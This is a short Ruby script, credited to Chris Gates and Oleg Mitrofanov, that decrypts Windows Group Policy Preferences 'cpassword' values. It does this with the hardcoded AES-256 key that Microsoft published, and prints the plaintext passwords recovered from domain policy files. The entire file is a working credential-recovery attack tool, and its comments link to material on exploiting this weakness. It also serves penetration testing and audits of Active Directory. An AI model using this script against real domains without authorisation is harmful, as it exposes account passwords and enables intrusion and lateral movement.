#!/usr/bin/env ruby

# Authored by: Chris Gates (carnal0wnage)  
# * http://www.slideshare.net/chrisgates/exploiting-group-policy-preferences  
# * http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
# 
# Polished by: Oleg Mitrofanov (reider-roque)
# * Updated to take a cpassword as a command line argument


require 'rubygems'
require 'openssl'
require 'base64'

def decrypt(cpassword)
    padding = "=" * (4 - (cpassword.length % 4))
    epassword = "#{cpassword}#{padding}"
    decoded = Base64.decode64(epassword)
  
    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
  
    return pass
end

if ARGV.length != 1
    abort "Usage: ruby #{File.basename($0)} CPASSWORD"
end

cpassword = ARGV[0]

begin
    puts decrypt(cpassword)
rescue
    puts "Fail! Make sure the supplied cpassword is correct."
end
